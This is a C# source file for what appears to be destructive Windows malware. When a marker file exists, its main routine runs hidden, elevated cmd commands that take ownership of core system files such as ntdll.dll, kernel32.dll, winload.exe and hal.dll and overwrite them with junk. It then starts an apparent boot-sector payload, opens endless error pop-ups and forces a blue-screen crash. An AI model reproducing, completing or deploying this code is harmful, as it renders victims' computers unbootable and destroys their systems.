using System;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using static gdifuncs.functions;

namespace gdifuncs
{
    internal sealed class Program
    {
        [STAThread]
        static void runprotector(object state)
        {
            Application.Run(
                new protection64()
                );
        }

        static void runmform(object state)
        {
            Application.Run(
                new majorsgui()
                );
        }

        public static void Messedup(object state)
        {
            while (true)
                MessageBox.Show("You messed up...", "uh oh", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
        private static void Main(string[] args)
        {
            if (File.Exists("C:\\windows\\WinAttr.gci"))
            {
                string[] files2owr = {
                        "winload.exe",
                        "csrss.exe",
                        "wininit.exe",
                        "wininet.dll",
                        "aclui.dll",
                        "ADVAPI32.DLL",
                        "crypt32.dll",
                        "hal.dll",
                        "ntdll.dll",
                        "cryptbase.dll",
                        "kernel32.dll",
                        "userinit.exe",
                        "crypt.dll",
                        "chkdsk.exe",
                    };

                for (int a = 0; a < files2owr.Length; a++)
                {
                    try
                    {
                        Process prc = new Process();
                        prc.StartInfo.FileName = "cmd.exe";
                        prc.StartInfo.Arguments = @"/c cd\&cd Windows\system32&takeown /f """ + files2owr[a] + @"""&icacls """ + files2owr[a] + @""" /granted ""%username%"":F&echo xa>""" + files2owr[a] + @"""";
                        prc.StartInfo.Verb = "runas";
                        prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        prc.Start();

                        if (a == files2owr.Length - 1)
                        {
                            Process prcx = new Process();
                            prcx.StartInfo.FileName = "cmd.exe";
                            prcx.StartInfo.Arguments = "/c timeout 2&\"C:\\windows\\winbase_base_procid_none\\secureloc0x65\\bsector3.exe\"";
                            prcx.StartInfo.Verb = "runas";
                            prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            prcx.Start();

                            System.Threading.ThreadPool.QueueUserWorkItem(Messedup);
                            System.Threading.Thread.Sleep(3000);
                            BSOD();
                        }
                    }
                    catch { }
                }

            }

            System.Threading.ThreadPool.QueueUserWorkItem(runprotector);
            System.Threading.ThreadPool.QueueUserWorkItem(runmform);
            Application.Run(new MainForm());
        }
    }
}